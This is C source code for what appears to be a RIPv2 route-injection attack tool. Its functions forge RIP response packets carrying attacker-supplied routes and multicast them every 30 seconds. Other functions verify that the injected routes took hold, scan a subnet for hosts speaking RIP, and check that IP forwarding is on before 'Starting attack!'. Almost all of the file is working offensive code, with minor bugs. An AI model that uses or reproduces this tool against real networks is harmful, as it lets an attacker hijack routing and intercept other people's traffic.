#include "fibc.h"

int offset_dl;
pcap_t *handle;

#define CASE(x,y) {	\
	case (x):	\
	offset_dl=(y);	\
	break;}

int
sizeof_datalink(pcap_t * pd)
{
	int dtl;

	if ((dtl = pcap_datalink(pd)) < 0)
         	fatal("no datalink info: %s", pcap_geterr(pd));

	switch (dtl) {
		CASE(AP_DLT_NULL, 4);
		CASE(AP_DLT_EN10MB, 14);
		CASE(AP_DLT_EN3MB, 14);
		CASE(AP_DLT_AX25, -1);
		CASE(AP_DLT_PRONET, -1);
		CASE(AP_DLT_CHAOS, -1);
		CASE(AP_DLT_IEEE802, 22);
		CASE(AP_DLT_ARCNET, -1);
#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__) || defined (__BSDI__)
		CASE(AP_DLT_SLIP, 16);
#else
		CASE(AP_DLT_SLIP, 24);
#endif

#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__)
		CASE(AP_DLT_PPP, 4);
#elif defined (__sun)
		CASE(AP_DLT_PPP, 8);
#else
		CASE(AP_DLT_PPP, 24);
#endif
		CASE(AP_DLT_FDDI, 21);
		CASE(AP_DLT_ATM_RFC1483, 8);

		CASE(AP_DLT_LOOP, 4);	/* according to OpenBSD DLT_LOOP
		 * collision: see "bpf.h" */
		CASE(AP_DLT_RAW, 0);

		CASE(AP_DLT_SLIP_BSDOS, 16);
		CASE(AP_DLT_PPP_BSDOS, 4);
		CASE(AP_DLT_ATM_CLIP, -1);
#if defined (__FreeBSD__) || defined (__OpenBSD__) || defined (__NetBSD__)
		CASE(AP_DLT_PPP_SERIAL, 4);
		CASE(AP_DLT_PPP_ETHER, 4);
#elif defined (__sun)
		CASE(AP_DLT_PPP_SERIAL, 8);
		CASE(AP_DLT_PPP_ETHER, 8);
#else
		CASE(AP_DLT_PPP_SERIAL, 24);
		CASE(AP_DLT_PPP_ETHER, 24);
#endif
		CASE(AP_DLT_C_HDLC, -1);
		CASE(AP_DLT_IEEE802_11, 30);
		CASE(AP_DLT_LINUX_SLL, 16);
		CASE(AP_DLT_LTALK, -1);
		CASE(AP_DLT_ECONET, -1);
		CASE(AP_DLT_IPFILTER, -1);
		CASE(AP_DLT_PFLOG, -1);
		CASE(AP_DLT_CISCO_IOS, -1);
		CASE(AP_DLT_PRISM_HEADER, -1);
		CASE(AP_DLT_AIRONET_HEADER, -1);
	default:
		fatal("unknown datalink type DTL_?=%d", dtl);
		break;
	}

	return offset_dl;
}

	
void
fatal(char *pattern,...)
{
	va_list ap;
	va_start(ap, pattern);
	vfprintf(stderr, pattern, ap);
	va_end(ap);
	exit(1);
}
	
char           *
in_ntoa(unsigned long in)
{
	static char     buff[18];
	char           *p;

	p = (char *) &in;
	sprintf(buff, "%d.%d.%d.%d",
		(p[0] & 255), (p[1] & 255), (p[2] & 255), (p[3] & 255));
	return (buff);
}

unsigned short
in_cksum(unsigned short *buh, int len)
{
	long            sum = 0;
	unsigned short  oddbyte;
	unsigned short  answer;

	while (len > 1) {
		sum += *buh++;
		len -= 2;
	}

	if (len == 1) {
		oddbyte = 0;
		*((unsigned char *) &oddbyte) = *(unsigned char *) buh;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}

void
init_all()
{
        if (geteuid()) {
                fprintf(stderr, "You must be root to run this tool\n");
                exit(1);
	}
	if ((dev = pcap_lookupdev(errbuf)) == NULL) fatal(" pcap_lookupdev: %s\n\n", errbuf);
	if (pcap_lookupnet(dev,(bpf_u_int32 *) &localnet, (u_int *)&routes[1][0], errbuf) < 0) fatal(" pcap_lookupnet: %s\n\n", errbuf);
	localaddr = libnet_get_ipaddr4((libnet_t *)dev);
	routes[3][0] = htonl(1);
	w = 1;
}

void
send_fake_rip_response()
{
	libnet_t *l;
	libnet_ptag_t udp;
	libnet_ptag_t ip;
	struct rip *pack;
	struct rip_message *entries;
	char errbuf[LIBNET_ERRBUF_SIZE];
        u_char buffer[504];
	int i;
	
	bzero(buffer, 504);

	pack = (struct rip *)(buffer);
	entries = (struct rip_message *)(buffer + sizeof(struct rip));

        pack->command = 2;
        pack->version = 2;

	for(i = 0; i < w; i++) {
		entries->family = htons(2);
		entries->tag = 0;
		entries->ip = routes[0][i];
		entries->netmask = routes[1][i];
		entries->gateway = routes[2][i];
		entries->metric = routes[3][i];
		entries++;
		}
	
        l = libnet_init(LIBNET_RAW4, dev, errbuf);

	udp = libnet_build_udp(
		RIP_PORT,
		RIP_PORT,
		LIBNET_UDP_H + sizeof(struct rip) + sizeof(struct rip_message)*w, //RISCHIO INTEGER OVERFLOW
		0,
		buffer,
		sizeof(struct rip) + sizeof(struct rip_message)*w,
		l,
		0);

        ip = libnet_build_ipv4(
                LIBNET_IPV4_H + LIBNET_UDP_H + sizeof(struct rip)+sizeof(struct rip_message)*w,
                0,
                3000 + (rand() % 100),
                0,
                64,
                IPPROTO_UDP,
                0,
                localaddr,
                inet_addr(RIP_GROUP),
                NULL,
                0,
                l,
                0);

if (libnet_toggle_checksum(l, udp, 1) < 0) fatal("pippo: %s\n\n", libnet_geterror(l));
	
     while(1) {
	if ((libnet_write(l)) < 0) fatal("libnet_write(): %s\n\n", libnet_geterror(l));   
	sleep(30);
     }

}

// the sysctl(2) for checking ip forward
// doesn't seem to work propertly, so using proc fs
void
check_forward()
{
	FILE           *fd;
	char            c;

	if ((fd = fopen("/proc/sys/net/ipv4/ip_forward", "r+")) < 0)
		fatal(" failed to open file: %s\n", strerror(errno));
	fscanf(fd, "%c", &c);
	fclose(fd);

	if (c != '1') {
		printf("\n IP FORWARDING IS NOT SET...ATTACK WONT WORK!\n");
		printf("\n Program will terminate...if you wanna continue anyway\n");
		printf(" run it with -f option or set packet forwarding on your box\n\n");
		exit(1);
	} else
		printf("\n IP FORWARDING SET. Starting attack!\n\n");
}

void
check_injection()
{
	char            buffer[BUFLEN], buffer_pkt[504];
	int             sock, letti, i;
	struct rip *rip_head;
	struct rip_message *rippo, *entries;
	struct sockaddr_in peer;

	rip_head = (struct rip *)(buffer_pkt);
	entries = (struct rip_message *)(buffer_pkt + sizeof(struct rip));
	
	rip_head->command = 1;
	rip_head->version = 2;
	
	for (i = 0; i < w; i++) {
                entries->family = htons(2);
                entries->tag = 0;
                entries->ip = routes[0][i];
                entries->netmask = routes[1][i];
                entries->gateway = routes[2][i];
                entries->metric = routes[3][i];
                entries++;
	}	
		
	peer.sin_family = AF_INET;
	peer.sin_addr.s_addr = inet_addr(RIP_GROUP);
	peer.sin_port = htons(RIP_PORT);

	if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) 
		fatal(" failed to create socket: %s\n\n", strerror(errno));
	
	fcntl(sock, F_SETFL, O_NONBLOCK);
	
	sleep(5);

	while (1) {
		rippo = (struct rip_message *) (buffer + 4);
		if (sendto(sock, buffer_pkt, sizeof(struct rip)+sizeof(struct rip_message)*w, 0, (struct sockaddr *) & peer, sizeof(peer)) < 0)
			fatal("  failed to send packets: %s\n\n", strerror(errno));
		sleep(1);
		if ((letti = recvfrom(sock, buffer, BUFLEN, 0, NULL, NULL)) < 0) printf("\nNo Response, Are you in a RIPv2 Lan?\n");
		
		for (i = 0; i < w; i++) {
			for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++) {
				if (rippo->ip == routes[0][i]) {
					if (ntohl(rippo->metric) == ntohl(routes[3][i]) + 1) {
						printf("\nRoute %s: Injected Correctly\n", in_ntoa(rippo->ip));
						fflush(stdout);
						break;
					} else {
						printf("\nRoute %s: Injection Failed\n", in_ntoa(rippo->ip));
						fflush(stdout);
						break;
					}
				}
			}
		}
		bzero(&buffer, sizeof(buffer));
		sleep(30);
	}
}

void pack_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  struct iphdr *ip;
  struct rip_message *rip_head;
  struct udphdr *udp;
  
  ip = (struct iphdr *)(packet + sizeof_datalink(handle));
  rip_head = (struct rip_message *)(packet + sizeof_datalink(handle) + \
		   			     sizeof(ip) +    \
					     sizeof(udp) + 4);
  
 printf(" HOST %s SPEAKS RIPv%i!!\n", in_ntoa((unsigned long)handle) , *(packet+sizeof_datalink(handle) + \
			   					    sizeof(ip) + \
								    sizeof(udp)+1));
 printf(" *-*-*-*-*-*-*-*-*-*-*-*-*\n");
 for (; (u_long) * (&rip_head) < (u_long) (packet) + header->caplen; rip_head++) {
    printf("   |-- IP: %s\n", in_ntoa(rip_head->ip));
    printf("   |------ Metric: %u\n", ntohl(rip_head->metric));
    printf("   |------ Netmask: %s\n", in_ntoa(rip_head->netmask));
    printf("   |------ Next Hop: %s\n", in_ntoa(rip_head->gateway));
    printf("   |------ Tag: %u\n", rip_head->tag);
    printf("   |------ Family: %u\n\n", htons(rip_head->family));
  }
}

void
listent(char *net)
{
        struct bpf_program filter;
	char filter_app[50];
	
	sprintf(filter_app, "src net %s and udp src port 520", net);
	handle = pcap_open_live(dev, BUFSIZ, 1, -1, errbuf);
	if (pcap_compile(handle, &filter, filter_app, 0, localnet) < 0)
		fatal(" pcap_compile: %s\n\n", pcap_geterr(handle));
	pcap_setfilter(handle, &filter);
	pcap_dispatch(handle, -1, pack_handler, NULL);
}

int 
scan_net(char *net)
{
	char           *prefix, *pcap_arg;
	pthread_t       pt;
	int             sock;
	unsigned long   start, end;
	struct {
		struct rip rip_head;
		struct rip_message entry;
	} rip_scan;
	struct sockaddr_in peers;

	peers.sin_family = AF_INET;
	peers.sin_port = htons(RIP_PORT);

	pcap_arg = strdup(net);
	if ((prefix = memchr(net, '/', strlen(net))) == NULL)
		fatal(" You must use the subnet/prefix format!!!\n Example: 192.168.0.0/24 format!!!\n\n");
	*(prefix) = '\0';
	start = inet_network(net);
	end = start + (1 << (32 - atoi(++prefix))); //DA CHEKKARE ! !!!!!

	bzero(&rip_scan, sizeof(rip_scan));

	rip_scan.rip_head.command = 1;
	rip_scan.rip_head.version = 2;
	rip_scan.entry.metric = htonl(16);

	if (pthread_create(&pt, NULL, (void *) listent, pcap_arg)) {
		fprintf(stderr, "\nerror while creating pthread\n");
		exit(1);
	}
	for (; start <= end; start++) {
		if (!(start & 0xff))
			start++;
		if ((start & 0xff) == 255)
			start++;
		peers.sin_addr.s_addr = htonl(start);
		sock = socket(AF_INET, SOCK_DGRAM, 0);
		sendto(sock, &rip_scan, sizeof(rip_scan), 0, (struct sockaddr *) & peers, sizeof(peers));
		close(sock);
	}

	sleep(5);
	pthread_cancel(pt);
	pthread_join(pt, NULL);
	free(pcap_arg);
	return 0;
}

void rip_file_read(char *filez)
{
  FILE *OPENF;
  int i; 
  
  if ((OPENF = fopen(filez, "r+")) == NULL)
    fatal("Unable to open %s\n.", filez);

  fscanf(OPENF, "%u\n", &w); 

  if (w > 25) fatal("%s corrupted\n\n", filez);
  
  for(i = 0; i < w; i++) 
    {
      fscanf(OPENF, "%u %u %u %u\n", &routes[0][i], &routes[1][i], &routes[2][i], &routes[3][i]);
      printf("Read: Route: %s Metric: %u\n", in_ntoa(routes[0][i]), ntohl(routes[3][i]));
    }

  fclose(OPENF);
}
